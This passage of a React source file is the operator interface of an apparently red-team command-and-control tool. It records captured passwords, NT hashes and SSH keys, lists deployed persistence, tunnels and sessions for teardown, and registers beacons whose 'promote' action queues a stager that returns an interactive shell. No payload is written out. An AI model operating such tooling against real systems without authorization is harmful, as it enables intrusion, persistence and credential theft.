      </div>
      {/* Original credential-recording pane, unchanged. */}
      <div className="field" style={{ marginTop: 10 }}><span className="fl">Record a captured credential</span>
        <input className="fin" placeholder="username" value={u} onChange={(e) => setU(e.target.value)} style={{ marginBottom: 6 }} />
        <input className="fin" placeholder="secret / hash" value={s} onChange={(e) => setS(e.target.value)} style={{ marginBottom: 6 }} />
        <div className="row" style={{ gap: 6 }}>
          <select className="fin" value={k} onChange={(e) => setK(e.target.value)} style={{ maxWidth: 130 }}>
            <option value="password">password</option><option value="nthash">nthash</option><option value="ssh-key">ssh-key</option>
          </select>
          <button className="btn sm primary" disabled={!u || !s} onClick={() => lootCred(session.id, { username: u, secret: s, kind: k }).then(() => { toast.show("credential recorded"); setU(""); setS(""); }).catch((e) => toast.show(String(e)))}>Add</button>
        </div>
      </div>
    </Menu>
  );
}

function TeardownDrawer({ inv, onClose }: { inv: TeardownInventory; onClose: () => void }) {
  const [busy, setBusy] = useState<string | null>(null);
  const [local, setLocal] = useState(inv);
  const reload = () => getTeardown().then(setLocal).catch(() => {});

  const act = async (id: string, fn: () => Promise<unknown>, label: string) => {
    setBusy(id);
    try { await fn(); toast.show(label); reload(); }
    catch (e) { toast.show(String(e)); }
    finally { setBusy(null); }
  };

  const removeAllPers = () => act("pers-all", async () => {
    const r = await removeAllPersistence();
    if (r.failed.length) toast.show(`${r.failed.length} failed to remove`);
  }, "persistence removal sent");

  const ROW: React.CSSProperties = { fontSize: 11, padding: "4px 0", borderBottom: "1px solid color-mix(in srgb,var(--line) 55%,transparent)", display: "flex", alignItems: "center", gap: 8 };

  return (
    <>
      <div className="drawer-backdrop" onClick={onClose} />
      <aside className="drawer" role="dialog" aria-label="teardown">
        <div className="drawer-head"><div style={{ fontWeight: 700 }}>Teardown · {local.total} artifacts</div><button className="icon-btn" onClick={onClose}>✕</button></div>
        <div className="drawer-body">
          <div className="muted" style={{ marginBottom: 10 }}>Everything recce deployed this engagement. Remove each artifact before you leave the network.</div>

          {/* Persistence */}
          <div style={{ marginBottom: 14 }}>
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center" }}>
              <h4 className="drawer-h">Persistence ({local.persistence.length})</h4>
              {local.persistence.length > 1 && <button className="btn sm danger" disabled={!!busy} onClick={removeAllPers}>Remove all</button>}
            </div>
            {local.persistence.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.persistence.map((p: TdPersistence) => (
                <div key={p.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{p.host_ip} <span className="faint">· {p.mechanism} · {p.artifact_path}</span></span>
                  <button className="btn sm danger" disabled={busy === p.id} onClick={() => act(p.id, () => removePersistence(p.id), `removal sent for ${p.host_ip}`)}>Remove</button>
                </div>
              ))}
          </div>

          {/* Uploads */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Uploads ({local.uploads.length})</h4>
            {local.uploads.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.uploads.map((u: TdUpload) => (
                <div key={u.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{u.host_ip}:{u.remote_path} <span className="faint">· {u.bytes || 0} B</span></span>
                  <button className="btn sm" disabled={busy === u.id} onClick={() => act(u.id, () => clearTeardownUpload(u.id), `marked ${u.remote_path} cleared`)}>Mark cleared</button>
                </div>
              ))}
          </div>

          {/* Listeners */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Listeners ({local.listeners.length})</h4>
            {local.listeners.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.listeners.map((l: TdListener) => (
                <div key={l.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>:{l.port} <span className="faint">· {l.kind}</span></span>
                  <button className="btn sm" disabled={busy === l.id} onClick={() => act(l.id, () => stopListener(l.id), `listener :${l.port} stopped`)}>Stop</button>
                </div>
              ))}
          </div>

          {/* Tunnels */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Tunnels ({local.tunnels.length})</h4>
            {local.tunnels.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.tunnels.map((t: TdTunnel) => (
                <div key={t.session_id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{t.host_ip} <span className="faint">· SOCKS :{t.socks_port}</span></span>
                  <button className="btn sm" disabled={busy === t.session_id} onClick={() => act(t.session_id, () => stopTunnel(t.session_id), `tunnel to ${t.host_ip} stopped`)}>Stop</button>
                </div>
              ))}
          </div>

          {/* Port-forwards */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Port-forwards ({local.portfwds.length})</h4>
            {local.portfwds.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.portfwds.map((pf: TdPortfwd, i: number) => (
                <div key={i} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>:{pf.lport} → {pf.rhost}:{pf.rport} <span className="faint">· {pf.host_ip || pf.session_id?.slice(0, 8)}</span></span>
                </div>
              ))}
          </div>

          {/* Sessions */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Sessions ({local.sessions.length})</h4>
            {local.sessions.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.sessions.map((s: TdSession) => (
                <div key={s.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{s.host_ip} <span className="faint">· {s.name || s.id.slice(0, 8)} · {s.kind}{s.pty ? " (PTY)" : ""}</span></span>
                  <button className="btn sm" disabled={busy === s.id} onClick={() => act(s.id, () => closeSession(s.id), `session ${s.name || s.id.slice(0, 8)} closed`)}>Close</button>
                </div>
              ))}
          </div>
        </div>
      </aside>
    </>
  );
}

// ---- Beacons panel (async-C2 P1) -------------------------------------------
// Async beacons live alongside listeners in the left column. Register spawns
// a new beacon-mode session; the RAW PSK is shown ONCE — the operator must
// copy it before dismissing (no server-side recovery — same trust model as
// the reverse-shell tokens).
function BeaconsPanel() {
  const [beacons, setBeacons] = useState<Beacon[]>([]);
  const [showRegister, setShowRegister] = useState(false);
  const [justRegistered, setJustRegistered] = useState<BeaconRegisterResponse | null>(null);

  const reload = () => { listBeacons().then((r) => setBeacons(r.beacons || [])).catch(() => {}); };
  useEffect(() => {
    reload();
    const t = window.setInterval(reload, 4000);
    return () => window.clearInterval(t);
  }, []);

  const doRetire = (bid: string, hint: string) => {
    if (!confirm(`Retire beacon ${hint}? The task+transcript history is kept.`)) return;
    deleteBeacon(bid).then(() => { toast.show("beacon retired"); reload(); })
                     .catch((e) => toast.show(String(e)));
  };

  return (
    <>
      <Panel title="Beacons"
             actions={<button className="btn sm primary" onClick={() => setShowRegister(true)}>+ Register</button>}>
        {beacons.length === 0 ? (
          <div className="muted" style={{ fontSize: 11 }}>
            No beacons. Register one, then have your target-side agent POST to
            <code style={{ margin: "0 3px" }}>/beacon/checkin</code> with the PSK.
          </div>
        ) : beacons.map((b) => (
          <BeaconRow key={b.id} b={b} onReload={reload}
                     onRetire={() => doRetire(b.id, b.host_ip || b.id.slice(0, 8))} />
        ))}
      </Panel>
      {showRegister && (
        <RegisterBeaconDrawer onClose={() => setShowRegister(false)}
          onRegistered={(js) => { setJustRegistered(js); setShowRegister(false); reload(); }} />
      )}
      {justRegistered && (
        <PskShownOnceModal r={justRegistered} onClose={() => setJustRegistered(null)} />
      )}
    </>
  );
}

function BeaconRow({ b, onRetire, onReload }: { b: Beacon; onRetire: () => void; onReload: () => void }) {
  const [editing, setEditing] = useState(false);
  const [sleep, setSleep] = useState(String(b.sleep_s));
  const [jitter, setJitter] = useState(String(b.jitter_pct));
  // `tick` advances every second so `seen 5s ago` counts up and the ⚡ flash
  // fades on schedule without waiting for the 4s beacon-list poll to re-render.
  const [, setTick] = useState(0);
  useEffect(() => {
    const t = window.setInterval(() => setTick((n) => n + 1), 1000);
    return () => window.clearInterval(t);
  }, []);
  const age = b.last_checkin > 0 ? (Date.now() / 1000 - b.last_checkin) : Infinity;
  const stale = b.last_checkin > 0 && age > b.sleep_s * 3;
  const neverSeen = b.last_checkin === 0;
  const dot = neverSeen ? "stale" : (stale ? "stale" : "live");
  const seen = neverSeen ? "never seen" : `seen ${Math.max(0, Math.round(age))}s ago`;
  // ⚡ within 3s of a fresh check-in — long enough to notice, short enough not
  // to lie about "just now" when the checkin was actually a minute ago.
  const fresh = b.last_checkin > 0 && age < 3;
  // Queued-tasks visibility: when a beacon is stale + tasks are backed up, an
  // operator who queued a pull will wonder why nothing happened. Poll the task
  // count for this beacon so we can show "N queued" and, when stale, a warning.
  const [queued, setQueued] = useState<number>(0);
  useEffect(() => {
    let cancel = false;
    const poll = () => {
      fetch(`/api/sessions/${encodeURIComponent(b.id)}/tasks?status=queued&limit=100`)
        .then((r) => r.ok ? r.json() : { tasks: [] })
        .then((j) => { if (!cancel) setQueued((j.tasks || []).length); })
        .catch(() => {});
    };
    poll();
    const t = window.setInterval(poll, 4000);
    return () => { cancel = true; window.clearInterval(t); };
  }, [b.id]);
  const [testing, setTesting] = useState(false);
  const runSelftest = () => {
    setTesting(true);
    selftestBeacon(b.id).then((r) => {
      if (r.ok) {
        const st = r.stages || {};
        toast.show(`self-test PASSED · queue ${st.queue_ms || 0}ms · deliver ${st.deliver_ms || 0}ms `
                 + `· result ${st.result_ms || 0}ms · ${st.saved_bytes || 0}B saved`);
      } else {
        toast.show(`self-test FAILED: ${r.reason || "unknown"}`);
      }
      onReload();
    }).catch((e) => toast.show(`self-test error: ${String(e)}`))
      .finally(() => setTesting(false));
  };
  const save = () => {
    const body: { sleep_s?: number; jitter_pct?: number } = {};
    const s = Number(sleep), j = Number(jitter);
    if (!isNaN(s) && s !== b.sleep_s) body.sleep_s = s;
    if (!isNaN(j) && j !== b.jitter_pct) body.jitter_pct = j;
    if (Object.keys(body).length === 0) { setEditing(false); return; }
    patchBeacon(b.id, body).then(() => { toast.show("beacon policy updated"); setEditing(false); onReload(); })
      .catch((e) => toast.show(String(e)));
  };
  return (
    <div style={{ padding: "4px 0", borderBottom: "1px solid color-mix(in srgb,var(--line) 40%,transparent)" }}>
      {/* Row 1 — the identity: dot + host + retire/edit right-aligned. Uncramped. */}
      <div className="row" style={{ gap: 6, alignItems: "center", fontSize: 12 }}>
        <span className={"sess-dot " + dot} />
        {b.host_ip
          ? <span className="mono" title={`beacon ${b.id}`}>{b.host_ip}</span>
          : <span className="mono faint" title={b.id}>{b.id.slice(0, 8)}</span>}
        {/* Pulse indicator: a checkin within the last 3s gets a brief ⚡ so team
            members watching the pane spot the tick they'd otherwise miss. */}
        {fresh && <span title="just checked in" style={{ color: "var(--ok, #16a34a)", fontSize: 10 }}>⚡</span>}
        {/* Queued-tasks chip: when tasks are backed up on a stale/never-seen
            beacon, an operator will wonder why nothing's happening. Red on
            stale = "tasks are waiting for a client that isn't polling"; muted
            on live = "just queued, will drain on next check-in". */}
        {queued > 0 && (
          <span className="chip" style={{ fontSize: 9,
                  color: (stale || neverSeen) ? "var(--err, #b91c1c)" : undefined,
                  fontWeight: (stale || neverSeen) ? 600 : undefined }}
                title={(stale || neverSeen)
                  ? "tasks are queued but the beacon isn't polling — is your on-target client running?"
                  : "tasks queued for next check-in"}>
            {queued} queued
          </span>
        )}
        <span className="right row" style={{ gap: 8 }}>
          <button className="linkish" onClick={() => {
            promoteBeacon(b.id)
              .then((r) => { toast.show(r.message || "promote queued"); onReload(); })
              .catch((e) => toast.show(String(e)));
          }} title="queue upgrade stager — beacon connects back as interactive shell on next check-in">
            promote
          </button>
          <button className="linkish" onClick={runSelftest} disabled={testing}
                  title="round-trip the pipeline in-process (queue → deliver → result → save) — proves everything works without needing a real on-target client">
            {testing ? "…" : "self-test"}
          </button>
          {!editing && <button className="linkish" onClick={() => setEditing(true)}>edit</button>}
          <button className="linkish" onClick={onRetire} title="retire — history kept">retire</button>
        </span>
      </div>
      {/* Row 2 — the metadata: transport, cadence, id, notes. Faint so it recedes. */}
      {!editing && (
        <div className="faint" style={{ fontSize: 10, marginLeft: 14, marginTop: 2 }}>
          {b.transport} · {b.sleep_s}s ±{b.jitter_pct}%
          {b.host_ip && <> · <span title={b.id}>{b.id.slice(0, 8)}</span></>}
          {" · "}{seen}
          {b.notes ? ` · ${b.notes}` : ""}
        </div>
      )}
      {/* Loud hint when tasks are backing up and no client is polling. Doesn't
          duplicate the chip's message — it explains what to do about it. */}
      {queued > 0 && (stale || neverSeen) && !editing && (
        <div style={{ fontSize: 10, marginLeft: 14, marginTop: 2,
                      color: "var(--warn, #b45309)" }}>
          ⚠ {queued} task(s) waiting — beacon hasn't polled. Run <span className="mono">self-test</span> to prove the server side, or start your on-target client.
        </div>
      )}
      {editing && (
        <div className="row" style={{ gap: 4, marginTop: 4, fontSize: 11, alignItems: "center" }}>
          <span className="faint">sleep</span>
          <input className="fin" type="number" min={1} max={3600} value={sleep} onChange={(e) => setSleep(e.target.value)}
                 style={{ width: 60, padding: "2px 4px" }} />
          <span className="faint">jitter %</span>
          <input className="fin" type="number" min={0} max={100} value={jitter} onChange={(e) => setJitter(e.target.value)}
                 style={{ width: 50, padding: "2px 4px" }} />
          <button className="btn sm primary" onClick={save}>save</button>
          <button className="btn sm" onClick={() => { setSleep(String(b.sleep_s)); setJitter(String(b.jitter_pct)); setEditing(false); }}>cancel</button>
        </div>
      )}
    </div>
  );
}

function RegisterBeaconDrawer({ onClose, onRegistered }:
  { onClose: () => void; onRegistered: (js: BeaconRegisterResponse) => void }) {
  const [host, setHost] = useState("");
  const [sleep, setSleep] = useState("30");
  const [jitter, setJitter] = useState("20");
  const [notes, setNotes] = useState("");
  const [busy, setBusy] = useState(false);
  const submit = () => {
    if (!host.trim()) { toast.show("host_ip required"); return; }
    setBusy(true);
    registerBeacon({ host_ip: host.trim(),
                     sleep_s: Number(sleep) || 30,
                     jitter_pct: Number(jitter) || 20,
                     notes: notes.trim() })
      .then(onRegistered)
      .catch((e) => toast.show(String(e)))
      .finally(() => setBusy(false));
  };
  return (
    <>
      <div className="drawer-backdrop" onClick={onClose} />
      <aside className="drawer" role="dialog" aria-label="register beacon" onKeyDown={(e) => { if (e.key === "Escape") onClose(); }}>
        <div className="drawer-head">
          <div>
            <div style={{ fontWeight: 700, fontSize: 15 }}>Register a beacon</div>
            <div className="muted" style={{ fontSize: 12 }}>The PSK will appear once — copy it before dismissing.</div>
          </div>
          <button className="icon-btn" onClick={onClose} title="close (Esc)">✕</button>
        </div>
        <div className="drawer-body">
          <label className="field"><span className="fl">host_ip</span>
            <input className="fin" value={host} onChange={(e) => setHost(e.target.value)} placeholder="10.0.0.5" autoFocus />
          </label>
          <div className="row" style={{ gap: 8 }}>
            <label className="field" style={{ flex: 1 }}><span className="fl">sleep (s)</span>
              <input className="fin" type="number" min={1} max={3600} value={sleep} onChange={(e) => setSleep(e.target.value)} />
            </label>
            <label className="field" style={{ flex: 1 }}><span className="fl">jitter %</span>
              <input className="fin" type="number" min={0} max={100} value={jitter} onChange={(e) => setJitter(e.target.value)} />
            </label>
          </div>
          <label className="field"><span className="fl">notes (optional)</span>
            <textarea className="fin" rows={2} value={notes} onChange={(e) => setNotes(e.target.value)}
                      placeholder="e.g. lab-dc01, test target for smoke run" />
          </label>
          <div className="row" style={{ gap: 8, marginTop: 12 }}>
            <button className="btn primary" disabled={busy} onClick={submit}>{busy ? "Registering…" : "Register"}</button>
            <button className="btn" onClick={onClose}>Cancel</button>
          </div>
        </div>
      </aside>
    </>
  );
}

function PskShownOnceModal({ r, onClose }: { r: BeaconRegisterResponse; onClose: () => void }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(r.psk).then(() => setCopied(true)).catch(() => {});
  };
  return (
    <div className="drawer-backdrop" onClick={onClose}>
      <div onClick={(e) => e.stopPropagation()}
           style={{ position: "fixed", inset: "15% 15%", background: "var(--bg)",
                    border: "1px solid var(--line)", borderRadius: 8, padding: 20,
                    display: "flex", flexDirection: "column", gap: 12, zIndex: 1000 }}>
        <div>
          <div style={{ fontWeight: 700, fontSize: 16 }}>Beacon registered</div>
          <div className="muted" style={{ fontSize: 12 }}>
            id <span className="mono">{r.id.slice(0, 12)}…</span> on {r.host_ip} · {r.transport} · {r.sleep_s}s ±{r.jitter_pct}%
          </div>
        </div>
        <div style={{ padding: 10, border: "1px solid var(--warn, #b45309)", borderRadius: 6,
                       background: "color-mix(in srgb, var(--warn, #b45309) 8%, transparent)" }}>
          <div style={{ fontWeight: 600, marginBottom: 4, fontSize: 12 }}>
            ⚠ Pre-shared key — shown ONCE
          </div>
          <div className="mono" style={{ fontSize: 13, wordBreak: "break-all", padding: "6px 0" }}>{r.psk}</div>
          <button className="btn sm primary" onClick={copy}>{copied ? "✓ copied" : "Copy PSK"}</button>
        </div>
        <div className="muted" style={{ fontSize: 12 }}>
          The client HMACs each check-in with this key: <br />
          <code>X-Beacon-Mac = hmac_sha256(psk, f"{"{id}:{ts}:"}".encode() + body).hexdigest()</code>
        </div>
        <div className="row" style={{ justifyContent: "flex-end" }}>
          <button className="btn" onClick={onClose}>Dismiss</button>
        </div>
      </div>
    </div>
  );
}
